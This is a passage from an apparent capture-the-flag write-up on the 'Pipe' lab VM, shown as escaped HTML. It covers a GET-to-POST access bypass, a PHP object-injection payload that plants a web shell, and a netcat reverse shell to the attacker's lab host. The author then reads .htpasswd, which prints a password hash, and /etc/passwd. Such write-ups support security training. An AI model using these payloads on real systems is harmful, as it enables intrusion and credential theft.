        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+$/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':{'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'undefined'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Fall-through&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// if the JS object has a property which contains a null value, the string cannot be unserialized by PHP&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'N'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But after some time I decided to fire up &lt;b&gt;Burp&lt;/b&gt; in order to find anything more as these scripts meant nothing to me.  &lt;/p&gt;

&lt;p&gt;And finally here it is, changing &lt;b&gt;GET&lt;/b&gt; to &lt;b&gt;POST&lt;/b&gt; resulted in access to the content. We can finally look at this website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;HTTP/1.1 200 OK
Date: Sat, 29 Jul 2017 21:05:19 GMT
Server: Apache
Vary: Accept-Encoding
X-Frame-Options: sameorigin
Content-Length: 2042
Connection: close
Content-Type: text/html; charset=UTF-8


&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scriptz/php.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;submit_form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;firstname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Rene'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;surname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Margitte'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;artwork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'The Treachery of Images'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;O:4:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:4:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'info_form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;The Treachery of Images&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&amp;lt;i&amp;gt;&lt;/span&gt;The Treachery of Images&lt;span class=&quot;nt&quot;&gt;&amp;lt;/i&amp;gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
From Wikipedia, the free encyclopedia
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
The Treachery of Images (French: La trahison des images, 1928â29, sometimes translated as The Treason of Images) is a painting by the Belgian surrealist painter RenÃ© Magritte, painted when Magritte was 30 years old. The picture shows a pipe. Below it, Magritte painted, &quot;Ceci n'est pas une pipe.&quot; [sÉ.si ne pazâ¿yn pip], French for &quot;This is not a pipe.&quot;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
&quot;The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it's just a representation, is it not? So if I had written on my picture 'This is a pipe', I'd have been lying!&quot;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
His statement is taken to mean that the painting itself is not a pipe. The painting is merely an image of a pipe. Hence, the description, &quot;this is not a pipe.&quot; The theme of pipes with the text &quot;Ceci n'est pas une pipe&quot; is extended in his 1966 painting, Les Deux MystÃ¨res. It is currently on display at the Los Angeles County Museum of Art.
The painting is sometimes given as an example of meta message conveyed by paralanguage. Compare with Korzybski's &quot;The word is not the thing&quot; and &quot;The map is not the territory&quot;.
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width:500px;overflow:hidden;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;images/pipe.jpg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;400px&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;auto&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info_form&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;param&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_form(); return false;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Show Artist Info.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But browser view will be much better. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/access_granted.png&quot; alt=&quot;Content&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see that there's the link, but clicking on it seemed to be broken, nothing was happening. After looking at Burp, I saw that it sends a parameter to the website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.103/index.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 225

param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And after decoding it we get a serialized message! That's where this scripts were used. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/burp_encoder.png&quot; alt=&quot;Encoder&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let's take a closer look at it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;O:4:&quot;Info&quot;:4:{s:2:&quot;id&quot;;i:1;s:9:&quot;firstname&quot;;s:4:&quot;Rene&quot;;s:7:&quot;surname&quot;;s:8:&quot;Margitte&quot;;s:7:&quot;artwork&quot;;s:23:&quot;The+Treachery+of+Images&quot;;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, after a long read of the scripts, their logic and how they work, I managed to write a simple serialized object that will take GET parameters as commands, and execute them. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;O:3:&quot;Log&quot;:2:{s:8:&quot;filename&quot;;s:30:&quot;/var/www/html/scriptz/shell.php&quot;;s:4:&quot;data&quot;;s:12:&quot;&amp;lt;?php echo system($_GET['cmd']); ?&amp;gt;&quot;;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it's time to encode it as URL and paste into the repeater. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/burp_repeater.png&quot; alt=&quot;Repeater&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It works, refreshing the &lt;b&gt;scriptz&lt;/b&gt; directory showed that a new file appeared! Let's test it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.56.103/scriptz/shell.php?cmd=whoami
www-data

http://192.168.56.103/scriptz/shell.php?cmd=uname%20-a
Linux pipe 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, it's now possible to inject commands. After looking for ways to reverse the shell, I found that &lt;b&gt;netcat&lt;/b&gt; was installed, which will make it much easier. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.56.103/scriptz/shell.php?cmd=nc%20-e%20/bin/sh%20192.168.56.102%201234

root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 49960
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we have the shell. We can use this Python trick to spawn &lt;b&gt;bash&lt;/b&gt; shell. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@pipe:/var/www/html/scriptz&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Everything is working so far. But, what was the password during the authentication?  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/var/www/html/scriptz&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
drwxr-xr-x 4 www-data www-data 4096 Jul  9  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root     root     4096 Jul  5  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  137 Jul  6  2015 .htaccess
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data   43 Jul  6  2015 .htpasswd
drwxr-xr-x 2 www-data www-data 4096 Jul  6  2015 images
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 2801 Jul  9  2015 index.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  150 Jul  6  2015 info.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  474 Jul  6  2015 log.php
drwxr-xr-x 2 www-data www-data 4096 Jul 30 06:00 scriptz
www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
rene:&lt;span class=&quot;nv&quot;&gt;$apr1$wfYjXf4U$0ZZ&lt;/span&gt;.qhGGrtkOxvKr5WFqX/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As it wasn't essential, I decided to find it as they may sometimes hold valuable information. But after looking at &lt;b&gt;/etc/passwd&lt;/b&gt; I noticed account using the same name &lt;b&gt;rene&lt;/b&gt;. Let's check &lt;strike&gt;her&lt;/strike&gt;  &lt;a href=&quot;https://en.wikipedia.org/wiki/Ren%C3%A9&quot;&gt;his&lt;/a&gt; home directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
rene:x:1000:1000:Rene Magritte,,,:/home/rene:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene
www-data@pipe:/home/rene&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
